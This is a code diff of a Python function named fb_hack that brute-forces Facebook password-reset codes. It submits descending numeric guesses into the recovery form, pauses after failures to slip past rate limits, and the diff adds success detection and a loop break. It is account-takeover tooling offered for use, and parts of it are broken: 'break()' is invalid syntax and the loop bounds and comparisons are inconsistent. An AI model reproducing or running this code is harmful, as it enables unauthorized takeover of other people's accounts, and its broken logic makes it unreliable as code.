@@ -165,31 +165,34 @@ def fb_hack():
     print(check2)
     reset = 99999999
   if check1 != test:
-    while check1 != test or reset > 999999:  
+    while check1 != test or reset > 99999:  
       browser.select_form(nr=0)
       y = reset
       browser.form['n'] = str(y)
       browser.submit()
       print(str(reset), end='\r')
       fail = (str(y), "failed")
+      success = (str(y), "succeded")
       s = " "
       reset = reset-1
       response1 = browser.response()
       soup = BeautifulSoup(response1, 'html.parser')
       check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
-      if check2 == check4:
+      if check1 == check3:
         print(s.join(fail))
         sleep(30)
       else:
-        z = 1
+        print(s.join(success))
+        break()
   elif check2 != test:
-    while check2 != test or reset > 99999999:
+    while check2 != test or reset > 9999999:
       browser.select_form(nr=0)
       y = reset
       browser.form['n'] = str(y)
       browser.submit()
       print(str(reset), end='\r')
       fail = (str(y), "failed")
+      success = (str(y), "succeded")
       s = " "
       reset = reset-1
       response1 = browser.response()
@@ -199,7 +202,8 @@ def fb_hack():
         print(s.join(fail))
         sleep(30)
       else:
-        z = 1
+        print(s.join(success))
+        break()
   else:
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
